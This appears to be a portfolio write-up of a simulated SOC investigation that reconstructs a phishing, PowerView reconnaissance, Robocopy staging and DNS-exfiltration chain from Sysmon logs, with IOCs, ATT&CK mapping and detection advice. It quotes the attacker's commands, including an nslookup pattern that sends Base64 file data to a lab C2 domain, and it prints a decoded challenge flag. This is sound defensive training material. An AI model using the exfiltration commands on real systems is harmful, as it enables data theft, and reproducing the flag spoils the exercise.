# Enterprise SOC Incident Investigation & Threat Hunting Report

> **Training / Lab Investigation:** This report documents a simulated enterprise SOC investigation performed as part of hands-on cybersecurity training. Hostnames, accounts, domains, and other artifacts belong to the exercise environment and should not be interpreted as evidence of a real-world incident.

## Incident Overview

| Field | Details |
|---|---|
| **Incident Title** | Multi-Stage Intrusion, Internal Reconnaissance, Data Staging, and Covert DNS Exfiltration |
| **Primary Compromised Host** | `win-3450` |
| **Compromised Account** | `michael.ascot` |
| **Attacker Infrastructure / C2 Domain** | `haz4rdw4re.io` |
| **Primary Impacted Resource** | `\\FILESRV-01\SSF-FinancialRecords` |
| **Investigation Framework** | MITRE ATT&CK / Cyber Kill Chain |
| **Investigation Type** | Simulated SOC / Threat Hunting Exercise |
| **Final Assessment** | Confirmed Multi-Stage Compromise and Data Exfiltration |

---

## 1. Executive Summary

During a simulated real-time Security Operations Center (SOC) alert triage exercise, SIEM event logs and Sysmon telemetry were used to investigate a series of correlated security events across enterprise endpoints.

Several alerts in the initial investigation queue were determined to be benign or false positives, including legitimate Windows system activity and email alerts that lacked additional malicious indicators.

However, investigation of host `win-3450` identified a confirmed multi-stage intrusion involving the account `michael.ascot`.

The observed attack chain included:

1. Phishing-based initial access.
2. PowerShell activity resulting in the creation of `PowerView.ps1`.
3. Active Directory and domain reconnaissance.
4. Access to a sensitive SMB financial share.
5. Bulk data collection using `Robocopy.exe`.
6. Local staging of collected files.
7. Removal of the mapped SMB drive.
8. Covert DNS-based data exfiltration using `nslookup.exe`.
9. Reconstruction of encoded payload fragments from DNS queries.

The investigation demonstrated how individual low-level telemetry events can be correlated into a complete attack chain.

### Attack Chain

```text
Initial Access
Phishing Attachment
        |
        v
PowerShell / PowerView
Domain Reconnaissance
        |
        v
SMB Share Access
\\FILESRV-01\SSF-FinancialRecords
        |
        v
Data Collection
Robocopy.exe
        |
        v
Local Data Staging
C:\Users\michael.ascot\Downloads\exfiltration\
        |
        v
Defense Evasion
net.exe use Z: /delete
        |
        v
DNS-Based Exfiltration
nslookup.exe
        |
        v
*.haz4rdw4re.io
        |
        v
Encoded Data / File Fragments
```

---

# 2. Investigation Scope

The investigation focused on:

- Identifying the initial compromise.
- Establishing a timeline of attacker activity.
- Identifying the compromised user and endpoint.
- Investigating PowerShell and process creation activity.
- Identifying internal reconnaissance.
- Determining whether sensitive network resources were accessed.
- Identifying data collection and staging behaviour.
- Investigating potential defense evasion.
- Identifying command-and-control infrastructure.
- Determining whether data was exfiltrated.
- Reconstructing encoded data contained within DNS queries.
- Separating genuine malicious activity from unrelated SOC noise.
- Developing containment, eradication, and hardening recommendations.

---

# 3. Complete Technical Timeline

All times below are recorded in UTC as provided by the training environment.

| Time (UTC) | Event | Host | Source / Process | Key Artifacts | Analysis / Phase |
|---|---|---|---|---|---|
| **01:53:40** | Alert 1005 | `win-3450` | Inbound Email | Sender: `external@domain`; Attachment: `ImportantInvoice-Febrary.zip` | **Initial Access — T1566.001** |
| **02:15:10** | Sysmon Event ID 11 | `win-3450` | `powershell.exe` PID `9060` | `C:\Users\michael.ascot\Downloads\PowerView.ps1` | **Discovery / Reconnaissance** |
| **02:17:05** | Sysmon Event ID 1 | `win-3450` | `net.exe` PID `5784`; Parent: `powershell.exe` PID `3728` | `net.exe use Z: \\FILESRV-01\SSF-FinancialRecords` | **Lateral Movement / SMB Access — T1021.002** |
| **02:17:52** | Sysmon Event ID 1 | `win-3450` | `Robocopy.exe` PID `8356`; Parent: `powershell.exe` PID `3728` | Recursive copy from `Z:\` to local staging directory | **Collection / Staging — T1074.001** |
| **02:18:03** | Sysmon Event ID 1 | `win-3450` | `net.exe` PID `8004`; Parent: `powershell.exe` PID `3728` | `net.exe use Z: /delete` | **Defense Evasion** |
| **02:18:50** | Sysmon Event ID 1 | `win-3450` | `nslookup.exe` PID `5520` | Encoded DNS query to `haz4rdw4re.io` | **Exfiltration — T1071.004** |
| **02:18:50** | Sysmon Event ID 1 | `win-3450` | `nslookup.exe` PID `3952` | Encoded subdomain | **Exfiltration — T1071.004** |
| **02:18:50** | Sysmon Event ID 1 | `win-3450` | `nslookup.exe` PID `5432` | Encoded subdomain | **Exfiltration — T1071.004** |
| **02:18:50** | Sysmon Event ID 1 | `win-3450` | `nslookup.exe` PID `3800` | Encoded binary chunk | **Exfiltration — T1071.004** |
| **02:18:50** | Sysmon Event ID 1 | `win-3450` | `nslookup.exe` PID `4752` | Encoded binary chunk | **Exfiltration — T1071.004** |
| **02:18:50** | Sysmon Event ID 1 | `win-3450` | `nslookup.exe` PID `5696` | Encoded filename | **Exfiltration — T1071.004** |
| **02:18:50** | Sysmon Event ID 1 | `win-3450` | `nslookup.exe` PID `5704` | Encoded data | **Exfiltration — T1071.004** |
| **02:18:50** | Sysmon Event ID 1 | `win-3450` | `nslookup.exe` PID `6604` | ZIP archive header | **Exfiltration — T1071.004** |
| **02:19:06** | Sysmon Event ID 1 | `win-3450` | `nslookup.exe` PID `3700` | Encoded flag fragment | **Exfiltration — T1071.004** |
| **02:19:06** | Sysmon Event ID 1 | `win-3450` | `nslookup.exe` PID `3648` | Encoded flag fragment | **Exfiltration — T1071.004** |

---

# 4. Initial Access and Reconnaissance

## 4.1 Phishing Attachment

The investigation began with an inbound email alert involving:

```text
ImportantInvoice-Febrary.zip
```

The attachment was delivered to:

```text
michael.ascot
```

on:

```text
win-3450
```

The event was assessed as the initial access vector.

### MITRE ATT&CK

**T1566.001 — Phishing: Spearphishing Attachment**

The attachment provided the initial entry point into the simulated environment.

---

## 4.2 PowerShell and PowerView

At:

```text
02:15:10 UTC
```

Sysmon Event ID 11 recorded the creation of:

```text
C:\Users\michael.ascot\Downloads\PowerView.ps1
```

The creating process was:

```text
powershell.exe
```

with PID:

```text
9060
```

`PowerView` is an offensive PowerShell-based tool commonly associated with Active Directory enumeration and PowerSploit.

The presence of the script in the user's Downloads directory shortly after the phishing event provided an important correlation between the initial access event and subsequent reconnaissance.

Potential reconnaissance objectives included:

- Domain enumeration.
- User discovery.
- Privileged account discovery.
- Trust discovery.
- Network share discovery.
- Identification of high-value resources.

### Relevant ATT&CK Techniques

- **T1087 — Account Discovery**
- **T1069 — Permission Groups Discovery**
- Other discovery techniques may apply depending on the specific commands executed by the script.

---

# 5. Internal Resource Access

At:

```text
02:17:05 UTC
```

Sysmon Event ID 1 recorded:

```text
net.exe
```

being launched by:

```text
powershell.exe
```

The command line was:

```cmd
"C:\Windows\system32\net.exe" use Z: \\FILESRV-01\SSF-FinancialRecords
```

This mapped the sensitive financial share to drive:

```text
Z:
```

### Important Indicators

```text
Source Host:
win-3450

User:
michael.ascot

Parent Process:
powershell.exe

Child Process:
net.exe

Mapped Drive:
Z:

Target:
\\FILESRV-01\SSF-FinancialRecords
```

The resource was identified as a high-value financial repository.

### MITRE ATT&CK

**T1021.002 — SMB/Windows Admin Shares**

The activity demonstrated access to an internal SMB resource from the compromised endpoint.

---

# 6. Data Collection and Local Staging

Approximately 47 seconds after the SMB share was mapped, the attacker executed:

```cmd
"C:\Windows\system32\Robocopy.exe" . C:\Users\michael.ascot\Downloads\exfiltration /E
```

The working directory was:

```text
Z:\
```

Therefore, the command recursively copied files from the mapped financial share into:

```text
C:\Users\michael.ascot\Downloads\exfiltration\
```

The `/E` parameter instructed `Robocopy` to copy subdirectories, including empty directories.

This established a clear:

```text
Network Share
     ↓
Local Collection
     ↓
Staging Directory
```

pattern.

### MITRE ATT&CK

**T1074.001 — Local Data Staging**

The data was consolidated locally before the subsequent exfiltration activity.

---

# 7. Defense Evasion

At:

```text
02:18:03 UTC
```

the attacker executed:

```cmd
"C:\Windows\system32\net.exe" use Z: /delete
```

This removed the mapped network share.

The sequence was:

```text
02:17:05
Map Z:
     ↓
02:17:52
Copy financial data
     ↓
02:18:03
Remove Z:
```

The rapid transition from data collection to share removal reduced the persistence of the visible mapped drive.

This activity is consistent with an attempt to reduce the local footprint of the operation.

> **Analyst note:** Removing a mapped share is not inherently malicious. In this investigation, its significance comes from the timing and its relationship to the preceding collection activity.

---

# 8. DNS-Based Exfiltration

Between:

```text
02:18:50
```

and:

```text
02:19:06
```

the endpoint generated multiple `nslookup.exe` processes.

The queries contained encoded strings embedded within subdomains of:

```text
haz4rdw4re.io
```

Example:

```text
nslookup.exe UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io
```

This behaviour was significant because:

1. Multiple DNS queries were generated within a short time window.
2. The queried subdomains contained long encoded-looking strings.
3. The strings could be decoded into meaningful content.
4. Some decoded content corresponded to filenames.
5. Other content contained ZIP magic bytes.
6. The domain was associated with the simulated attacker infrastructure.
7. The activity occurred immediately after sensitive data was staged locally.

This combination provided strong evidence of DNS-based data exfiltration.

---

# 9. DNS Payload Reconstruction

## 9.1 ZIP Magic Bytes

The following query contained:

```text
UEsDBBQ
```

Base64 decoding produced:

```text
PK\x03\x04
```

`PK\x03\x04` is the standard ZIP file magic-byte signature.

Another observed payload beginning with:

```text
AFBLAwQU
```

was also associated with ZIP archive data.

This provided evidence that binary/compressed data was being represented within the DNS query stream.

---

## 9.2 Exfiltrated Filenames

The investigation recovered several filenames from encoded DNS query fragments.

### ClientPortfolio

```text
Encoded:
8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv
```

Decoded content included:

```text
ClientPortfolio
```

### Summary.xlsx

```text
Encoded:
U3VtbWFyeS54bHN4c87JTM0rCcgvKk
```

Decoded content included:

```text
Summary.xlsx
```

### Presentation2023.pptx

```text
Encoded:
dGF0aW9uMjAyMy5wcHR488wrSy0uyS
```

Decoded content included:

```text
Presentation2023.pptx
```

### InvestorPresentation

```text
Encoded:
AdAAAAHQAAAEludmVzdG9yUHJlc2Vu
```

Decoded content included:

```text
InvestorPresentation
```

These artifacts further connected the DNS activity to the data previously collected from the financial share.

---

# 10. Exfiltration Verification

Two encoded fragments were recovered from the DNS query stream.

### Fragment 1

```text
VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm
```

Decoded:

```text
THM{1497321f4f6f059a52
```

### Fragment 2

```text
RmYjEyNGZiMTY1NjZlfQ==
```

Decoded:

```text
f6b124fb16566e}
```

Combining the fragments produced:

```text
THM{1497321f4f6f059a52f6b124fb16566e}
```

This was used by the training environment as verification that the exfiltration investigation had successfully reconstructed the expected payload.

> **Portfolio note:** Verification tokens from training platforms should generally be retained only when permitted by the platform's terms. Do not publish proprietary challenge answers or flags if the platform prohibits doing so.

---

# 11. Process Correlation

The process tree provides a useful representation of the activity:

```text
powershell.exe
│
├── net.exe
│   └── Map Z:
│       \\FILESRV-01\SSF-FinancialRecords
│
├── Robocopy.exe
│   └── Copy financial data
│       → C:\Users\michael.ascot\Downloads\exfiltration\
│
├── net.exe
│   └── Delete Z:
│
└── nslookup.exe
    ├── Encoded DNS query
    ├── Encoded DNS query
    ├── Encoded DNS query
    ├── Encoded DNS query
    └── Encoded DNS query
```

The parent-child relationships were particularly valuable because they connected the individual commands into a coherent sequence.

---

# 12. Attack Chain Reconstruction

The complete activity can be represented as:

```text
Phishing Attachment
        |
        v
PowerShell Execution
        |
        v
PowerView.ps1
        |
        v
Domain / Account Discovery
        |
        v
SMB Financial Share Access
        |
        v
Robocopy Collection
        |
        v
Local Data Staging
        |
        v
SMB Share Removal
        |
        v
nslookup.exe
        |
        v
Encoded DNS Queries
        |
        v
DNS Exfiltration
```

This sequence demonstrates why individual events should not always be investigated in isolation.

A single:

```text
nslookup.exe
```

execution might be legitimate.

A single:

```text
Robocopy.exe
```

execution might also be legitimate.

A single:

```text
net.exe use
```

command may be normal administrative activity.

However:

```text
Phishing
  +
PowerView
  +
Sensitive SMB access
  +
Bulk Robocopy
  +
Local staging
  +
Share removal
  +
Encoded DNS
```

forms a significantly stronger behavioural chain.

---

# 13. SOC Noise Reduction and False Positive Analysis

During the broader incident queue review, 18 alerts were analysed.

| Classification | Count |
|---|---:|
| True Positives / Compromise Chain | 11 |
| False Positives / Tuning Required | 7 |
| **Total** | **18** |

The purpose of this triage was to distinguish genuine malicious activity from benign enterprise telemetry.

---

## 13.1 Non-Standard TLD Email Alerts

### Alerts

```text
1018
1035
```

### Observed Activity

Inbound emails originated from domains using:

```text
.online
gmail.com
```

The messages contained promotional text such as:

```text
Win a trip to Hat Disneyland
```

No malicious attachments, executable scripts, or suspicious hyperlinks were identified.

### Assessment

**False Positive**

The email rule detected a weak signal without sufficient supporting evidence.

### Recommended Tuning

Increase the importance of TLD anomalies only when combined with additional indicators such as:

- Malicious hyperlinks.
- Suspicious attachments.
- Double extensions.
- Macro-enabled documents.
- Known malicious sender infrastructure.
- URL reputation failures.
- Attachment hash matches.
- Suspicious sender/domain reputation.

---

# 14. Windows Core System Process Alerts

### Alerts

```text
1019
1021
```

### Observed Activity

The alerts involved:

```text
svchost.exe
    ↓
taskhostw.exe
    ↓
KEYROAMING
```

on:

```text
win-3460
win-3451
```

The activity corresponded to the Windows:

```text
\Microsoft\Windows\CertificateServicesClient\KeyRoamingTask
```

scheduled task.

### Assessment

**False Positive / Expected System Activity**

The process relationship was consistent with legitimate Windows functionality.

### Recommended Tuning

Consider reducing alert priority when the following conditions are simultaneously satisfied:

- Expected parent process.
- Expected child process.
- Native Windows System32 location.
- Expected Microsoft-signed binaries.
- Known scheduled task.
- Expected command-line parameters.
- Expected execution context.

Baseline exclusions should be narrowly scoped rather than broadly excluding the process names.

---

# 15. MITRE ATT&CK Mapping

| Attack Phase | Technique | Technique ID | Evidence |
|---|---|---|---|
| Initial Access | Phishing: Spearphishing Attachment | **T1566.001** | `ImportantInvoice-Febrary.zip` |
| Discovery | Account Discovery | **T1087** | PowerView activity |
| Discovery | Permission Groups Discovery | **T1069** | PowerView activity |
| Lateral Movement | SMB/Windows Admin Shares | **T1021.002** | `net.exe use Z:` |
| Collection | Local Data Staging | **T1074.001** | Local `exfiltration` directory |
| Command and Control / Exfiltration | DNS | **T1071.004** | `*.haz4rdw4re.io` |
| Exfiltration | Exfiltration Over C2 Channel | **T1041** | Data transmitted through attacker-controlled infrastructure |

> ATT&CK mappings should be treated as evidence-based classifications. The presence of a command or tool does not automatically prove that every associated technique was used.

---

# 16. Indicators of Compromise

## 16.1 Host Indicators

| Indicator | Value |
|---|---|
| Compromised Host | `win-3450` |
| Compromised Account | `michael.ascot` |
| PowerView Path | `C:\Users\michael.ascot\Downloads\PowerView.ps1` |
| Staging Directory | `C:\Users\michael.ascot\Downloads\exfiltration\` |

---

## 16.2 Suspicious Command Patterns

### SMB Share Mapping

```cmd
net.exe use Z: \\FILESRV-01\SSF-FinancialRecords
```

### Data Collection

```cmd
Robocopy.exe . C:\Users\michael.ascot\Downloads\exfiltration /E
```

### Share Removal

```cmd
net.exe use Z: /delete
```

### DNS Exfiltration Pattern

```text
nslookup.exe <Base64_Payload>.haz4rdw4re.io
```

---

## 16.3 Network Indicators

| Indicator | Value |
|---|---|
| C2 / Exfiltration Domain | `haz4rdw4re.io` |
| DNS Pattern | `*.haz4rdw4re.io` |
| Target SMB Share | `\\FILESRV-01\SSF-FinancialRecords` |

---

# 17. Immediate Containment Plan

## Phase 1 — Immediate Containment

### 1. Isolate the Endpoint

Use the enterprise EDR to isolate:

```text
win-3450
```

The objective is to prevent further communication with the attacker infrastructure while preserving the endpoint for investigation.

### 2. Terminate Malicious Processes

Identify and terminate the malicious PowerShell process and associated child processes where appropriate.

Relevant processes include:

```text
powershell.exe
nslookup.exe
Robocopy.exe
```

Process termination should be coordinated with evidence-preservation requirements.

### 3. Block Attacker Infrastructure

Block:

```text
haz4rdw4re.io
*.haz4rdw4re.io
```

at appropriate security controls, including:

- DNS filtering.
- Secure web/DNS gateways.
- Firewall controls.
- EDR network controls.

### 4. Restrict Direct External DNS

Where enterprise architecture permits, prevent endpoints from directly communicating with external DNS infrastructure.

Require DNS resolution through approved enterprise resolvers.

### 5. Invalidate Credentials

For:

```text
michael.ascot
```

consider:

- Password reset.
- Session invalidation.
- Kerberos ticket invalidation.
- Review of active authentication sessions.
- Investigation for credential reuse elsewhere.

---

# 18. Eradication and Remediation

## Phase 2 — Eradication

### Remove Malicious Artifacts

Quarantine and preserve evidence before removal of:

```text
C:\Users\michael.ascot\Downloads\PowerView.ps1
```

and:

```text
C:\Users\michael.ascot\Downloads\exfiltration\
```

### Review SMB Access

Review:

```text
FILESRV-01
```

for:

- Additional accounts.
- Additional source hosts.
- Unusual access times.
- Unusual file access.
- Bulk file reads.
- Additional staging activity.

### Investigate Lateral Movement

Search for evidence that the compromised credentials were used on other systems.

Relevant authentication telemetry may include:

```text
4624
4625
4672
4768
4769
4771
```

depending on the environment.

### Forensic Preservation

Where required by organizational incident-response procedures:

- Preserve endpoint evidence.
- Capture memory where appropriate.
- Preserve relevant disk evidence.
- Preserve SIEM logs.
- Preserve DNS logs.
- Preserve email artifacts.
- Preserve file-server audit logs.

Reimaging should occur only after required forensic evidence has been collected and preserved.

---

# 19. Post-Incident Hardening

## 19.1 DNS Tunnel Detection

Develop detections for suspicious DNS behaviour including:

- Excessively long subdomains.
- High-frequency DNS queries.
- High-entropy labels.
- Unusual Base64-like character distributions.
- Repeated queries to previously unseen domains.
- Large numbers of unique subdomains.
- DNS requests generated by unusual processes.
- Direct DNS traffic bypassing enterprise resolvers.

Detection should combine multiple signals rather than relying solely on subdomain length.

---

## 19.2 PowerShell Hardening

Recommended controls include:

- PowerShell Script Block Logging.
- PowerShell Module Logging.
- PowerShell Transcription where appropriate.
- Constrained Language Mode where appropriate.
- Application control.
- EDR monitoring.
- Detection of suspicious command-line patterns.

Relevant Windows PowerShell telemetry may include:

```text
4103
4104
```

where the corresponding logging features are enabled.

---

## 19.3 Least Privilege

Review access to:

```text
\\FILESRV-01\SSF-FinancialRecords
```

and ensure access is granted only to users and groups that require it.

Review:

- Share permissions.
- NTFS permissions.
- Security group membership.
- Excessive access.
- Stale accounts.
- Service accounts.
- Administrative privileges.

---

# 20. Detection Engineering Opportunities

The investigation identified several opportunities for additional detections.

## Detection 1 — Suspicious PowerShell + Downloads

Alert when:

```text
powershell.exe
```

creates or executes scripts from:

```text
C:\Users\*\Downloads\
```

especially when followed by:

- Discovery commands.
- Network share access.
- Credential-related activity.
- Unusual child processes.

---

## Detection 2 — Robocopy from Sensitive Shares

Increase risk when:

```text
Robocopy.exe
```

copies large numbers of files from sensitive SMB shares into user-controlled local directories.

Potential enrichment:

```text
Source Share
Destination Directory
File Count
File Volume
User
Host
Parent Process
```

---

## Detection 3 — DNS Queries from `nslookup.exe`

Investigate unusual execution of:

```text
nslookup.exe
```

when it produces:

- High-frequency queries.
- Long subdomains.
- Encoded-looking labels.
- Large numbers of unique labels.
- Queries to newly observed domains.

---

## Detection 4 — Multi-Stage Correlation

A higher-confidence detection could correlate:

```text
PowerShell
     +
PowerView / Discovery
     +
SMB Share Access
     +
Robocopy
     +
Local Staging
     +
nslookup
     +
Suspicious DNS Domain
```

This behavioural correlation would provide substantially stronger evidence than alerting on any individual command.

---

# 21. Investigation Lessons Learned

## 21.1 Individual Events Can Be Benign

Examples:

```text
Robocopy.exe
nslookup.exe
net.exe
PowerShell
```

can all be legitimate.

The surrounding context determines their significance.

---

## 21.2 Process Trees Are Extremely Valuable

The parent-child relationship:

```text
powershell.exe
    ↓
net.exe
    ↓
Robocopy.exe
    ↓
nslookup.exe
```

helped establish a coherent attack sequence.

---

## 21.3 Time Correlation Matters

The short time intervals between:

```text
SMB Mapping
    ↓
Data Collection
    ↓
Share Removal
    ↓
DNS Exfiltration
```

significantly strengthened the investigation.

---

## 21.4 Data Staging Can Connect Collection to Exfiltration

The presence of:

```text
Downloads\exfiltration\
```

provided an intermediate stage between internal collection and external transmission.

This created a useful investigative pivot.

---

## 21.5 DNS Can Carry More Than Simple Name Resolution

DNS is normally associated with name resolution, but attackers can abuse DNS as a communication or exfiltration channel.

Indicators may include:

```text
Long labels
High query frequency
Encoded data
High entropy
Many unique subdomains
Unusual querying processes
Unusual domains
```

---

# 22. Analyst Investigation Workflow

The investigation followed the general workflow:

```text
Alert
  ↓
Triage
  ↓
Identify Host
  ↓
Identify User
  ↓
Build Timeline
  ↓
Inspect Process Tree
  ↓
Identify Initial Access
  ↓
Investigate Discovery
  ↓
Investigate Internal Access
  ↓
Identify Collection
  ↓
Identify Staging
  ↓
Investigate C2 / Exfiltration
  ↓
Correlate Evidence
  ↓
Map to ATT&CK
  ↓
Determine Verdict
  ↓
Contain
  ↓
Eradicate
  ↓
Harden
  ↓
Document
```

---

# 23. Final Assessment

The evidence supports a confirmed multi-stage compromise of:

```text
win-3450
```

under the account:

```text
michael.ascot
```

The observed sequence was:

```text
Phishing
    ↓
PowerShell
    ↓
PowerView
    ↓
Domain Reconnaissance
    ↓
Sensitive SMB Share Access
    ↓
Robocopy Collection
    ↓
Local Staging
    ↓
Share Removal
    ↓
DNS-Based Exfiltration
```

The combination of endpoint telemetry, process relationships, file activity, network-share access and encoded DNS queries provided sufficient evidence to reconstruct the attack chain.

The DNS payload analysis additionally demonstrated that data associated with the collected files was transmitted through the simulated attacker-controlled domain.

---

# 24. Skills Demonstrated

This investigation demonstrated practical experience with:

- SOC alert triage.
- SIEM investigation.
- Sysmon Event ID 1 analysis.
- Sysmon Event ID 11 analysis.
- Windows process investigation.
- Parent-child process correlation.
- PowerShell investigation.
- Active Directory reconnaissance analysis.
- SMB/share investigation.
- Data collection analysis.
- Data staging analysis.
- DNS investigation.
- Base64 decoding.
- DNS tunnelling analysis.
- IOC extraction.
- Timeline construction.
- MITRE ATT&CK mapping.
- Cyber Kill Chain analysis.
- False-positive identification.
- Detection tuning.
- Incident containment planning.
- Incident eradication planning.
- Post-incident hardening.
- Threat hunting.
- Detection engineering.

---

# 25. Portfolio Takeaway

The most important lesson from this investigation was:

> **An individual event rarely tells the whole story. Analysts create understanding by correlating events across time, processes, users, hosts, files, network connections and authentication activity.**

The strongest evidence was not a single alert.

It was the correlation of:

```text
Phishing
+
PowerShell
+
PowerView
+
SMB
+
Robocopy
+
Local Staging
+
Share Removal
+
Encoded DNS
```

into a single behavioural sequence.

---

# 26. Related Portfolio Investigations

| Investigation | Focus |
|---|---|
| [001 — OneDrive → Explorer Process Access](001-onedrive-explorer-process-access.md) | Sysmon Event ID 10 / Process Access |
| [002 — Windows Failed Logon Investigation](002-windows-failed-logon-investigation.md) | Windows authentication / Event IDs 4624/4625 |
| **003 — Multi-Stage Intrusion & DNS Exfiltration** | Threat hunting / SIEM correlation / DNS exfiltration |
| 004 — PowerShell Investigation | PowerShell / Script Block Logging |
| 005 — DNS Investigation | DNS telemetry / suspicious queries |
| 006 — Suspicious Network Connection | Sysmon Event ID 3 / network analysis |
| 007 — Phishing Investigation | Email analysis / IOC extraction |
| 008 — PCAP Investigation | Wireshark / network forensics |

---

# 27. References

- [MITRE ATT&CK](https://attack.mitre.org/)
- [Microsoft Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [Microsoft Windows Security Auditing](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/basic-audit-account-logon-events)
- [Wazuh Documentation](https://documentation.wazuh.com/)
- [Wireshark](https://www.wireshark.org/)
- [Cyber Kill Chain — Lockheed Martin](https://www.lockheedmartin.com/en-us/who-we-are/business-areas/cyber/cyber-kill-chain.html)

---

## Investigation Classification

**Classification:** Confirmed malicious activity within a simulated training environment.

**Primary Techniques:**

```text
T1566.001
T1087
T1069
T1021.002
T1074.001
T1071.004
T1041
```

**Primary Evidence Sources:**

```text
SIEM Alerts
Sysmon Event ID 1
Sysmon Event ID 11
Process Command Lines
File Paths
SMB Share Activity
DNS Queries
Decoded Payloads
```
